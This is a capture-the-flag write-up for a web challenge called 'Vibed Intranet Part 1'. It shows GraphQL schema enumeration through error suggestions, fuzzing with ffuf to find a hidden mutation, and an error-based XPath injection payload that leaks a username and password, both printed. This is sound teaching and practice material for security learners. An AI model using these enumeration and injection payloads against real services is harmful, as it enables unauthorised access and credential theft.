#### Vibed Intranet Part 1
- points earned: 475
#### Investigating the app
- There's no source code provided with this challenge, so this will be a black-box strategy.
- The only functionality that I can find on the main app is a login.
	- There is link to `Reset password` but it doesn't actually go anywhere.
- Submitting the login form and taking a look at the requests that were sent I see a `/graphql` route with the contents below.
	```json
	{
		"query": "mutation Login($username: String!, $password: String!) {\n  login(username: $username, password: $password) {\n    authenticated\n    message\n    token\n    tokenExpiresAt\n  }\n}",
		"variables":{ "username": "asd", "password":"asd" }
	}
	```
- Following standard graphql enumeration I first check for introspection.
	```json
	 {"query": "{__schema{queryType{name}}}" }
	```
	- This results in a message containing `GraphQL introspection is not allowed by Apollo Server`
- Next is to check if graphQL will give me suggestions so I take the working login payload and change `login` to `loginX`.
	```json
	{
		"query": "mutation Login($username: String!, $password: String!) {\n  loginX(username: $username, password: $password) {\n    authenticated\n    message\n    token\n    tokenExpiresAt\n  }\n}",
		"variables": { "username": "asd", "password": "asd" }
	}
	```
	- The result contains `Did you mean \"login\"?` which means that I might be able to leak information about this graphQL's schema.
- I spent some time manually checking for some type of functionality that might be related to password reset.
	- I do this because the main page states `This page is in an early beta with limited functionality available.`  So perhaps the password reset functionality is disabled in the UI but still available on the backend.
	- I find nothing. :/
- I decide to see if I can FUZZ some results with ffuf.
	- The command was
		```
		ffuf -w ~/opt/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt --request 1.req -mr 'Did you mean' -fr 'Did you mean \\"login\\"'
		```
	- The `1.req` file contained
		```http
		POST /graphql HTTP/1.1  
		Host: vibed-intranet-p1-54fa9f92337aca83.tjc.tf  
		content-type: application/json  
		  
		{"query":"mutation { FUZZ }"}
		```
	- This resulted in discovery of the `updateStudentX` functionality.

#### Investigating `updateStudentX`
- To enumerate `UpdateStudentX` I just use the login request and replace `login` with `UpdateStudentX`.
```json
{
	"query": "mutation Login($username: String!, $password: String!) {\n  updateStudentX(username: $username, password: $password) {\n    authenticated\n    message\n    token\n    tokenExpiresAt\n  }\n}",
	"variables": { "username":"asd", "password":"asd" } }
```
- The response contained eveything needed to construct a proper `updateStudentX` request.  For example:
	- `"message": "Cannot query field \"token\" on type \"UpdateStudentXResult\". Did you mean \"ok\"?"` tells me that I can query for an `ok` field
	- `"message": "Field \"updateStudentX\" argument \"description\" of type \"String!\" is required, but it was not provided.` tells me that I can provide a `description` argument
	- `"message": "Field \"updateStudentX\" argument \"grade\" of type \"Int!\" is required, but it was not provided."` tells me that I can provide a `grade` argument
- After some playing around I am able to come up with a working payload for a `` query.
	- A request with the following body
		```json
		{ 
			"query": "mutation updateStudentX($username: String!, $description: String!, $grade: Int!) { updateStudentX(username: $username, description: $description, grade: $grade) { ok } }",
			"variables": { "username": "meow", "description": "bark", "grade":100 } }
		```
	- results in a response
		```json
		{ "data": { "updateStudentX": { "ok": false } } }
		```
- I spent some time playing with this to see if I could enumerate a valid user without any luck.  My assumption was that if I find a valid user then the response will contain `"ok": true`.
- Moving along I decide to check for injection vulnerabilities in any of the fields and find that if I use a username `'meow'` then I get the response below.
	```json
	{
	    "errors": [{
	        "message": "XPath parse error",
	        "locations": [{
	            "line": 1,
	            "column": 84
	        }],
	        "path": ["updateStudentX"],
	        "extensions": {
	            "code": "INTERNAL_SERVER_ERROR"
	        }
	    }],
	    "data": null
	}
	```
	- This tells me that XPATH is being used as the backend db.
	- Now I can begin to form XPATH payloads for enumeration of the XPATH db.
- I spent quite a bit of time trying to come up with a solid boolean based approach to leaking data but failed.  I was only able to come up with an error based approach that worked to exfil a valid username and password.  I'm curious what others ended up with here.
	- The actual code that I used is attached to this repo but the general theory was that if I use the username below then it will result in an error on valid `word`'s and no error otherwise.
		```
		"username": f"x'] | //password[starts-with(text(),\"{word}\")] | //meow[@attr='1","description":"adminDesc"
		```
- I was able to use this approach to leak valid credentials
	- username: `Andyrew`
	- password: `amkji2ho2hO#*EH*(@Hhshag`
- After logging in you get the flag.

#### Solution
- Exploit XPATH injection via graphQL.
- Leak valid username and password
	- username: `Andyrew`
	- password: `amkji2ho2hO#*EH*(@Hhshag`
- Login to get the flag.
- This is where the `Vibed Intranet Part 2` challenge begins.
